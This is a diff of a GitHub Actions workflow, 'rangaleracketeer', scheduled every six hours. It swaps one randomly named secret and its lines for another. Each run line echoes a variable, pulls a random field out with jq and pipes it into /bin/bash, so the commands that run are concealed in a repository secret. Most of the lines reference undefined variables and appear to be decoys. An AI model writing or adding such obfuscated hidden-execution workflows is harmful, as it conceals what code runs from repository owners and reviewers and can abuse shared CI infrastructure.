@@ -1,28 +1,25 @@
 name: rangaleracketeer
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 4/6 * * *'
+    - cron: '16 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: rangaleracketeer
         env:
-          pdvcu7801: ${{ secrets.pdvcu7801 }}
+          g14: ${{ secrets.g14 }}
         run: |
-          echo $pdvcu7801 | jq -r .jzn89992 | /bin/bash
-          echo $fxep6918 | jq -r .gt149 | /bin/bash
-          echo $gyf410 | jq -r .d89 | /bin/bash
-          echo $puyv4 | jq -r .judru9285 | /bin/bash
-          echo $b43568 | jq -r .jpvm69 | /bin/bash
-          echo $ovw187 | jq -r .e6 | /bin/bash
-          echo $algxp3 | jq -r .y68270 | /bin/bash
-          echo $gyhri95857 | jq -r .y22 | /bin/bash
-          echo $xfpv0031 | jq -r .qrs1 | /bin/bash
-          echo $zza06 | jq -r .jqvpb251 | /bin/bash
+          echo $g14 | jq -r .inn96560 | /bin/bash
+          echo $jcgrp50759 | jq -r .m861 | /bin/bash
+          echo $mqdq137 | jq -r .rtur3010 | /bin/bash
+          echo $hqcaj8230 | jq -r .l45 | /bin/bash
+          echo $e57 | jq -r .mzhvx0182 | /bin/bash
+          echo $bigfc70 | jq -r .pthjq20324 | /bin/bash
+          echo $kcbo429 | jq -r .grko1 | /bin/bash
+          echo $syt8802 | jq -r .lcxb86 | /bin/bash
+          echo $hcvm8873 | jq -r .g14658 | /bin/bash
 
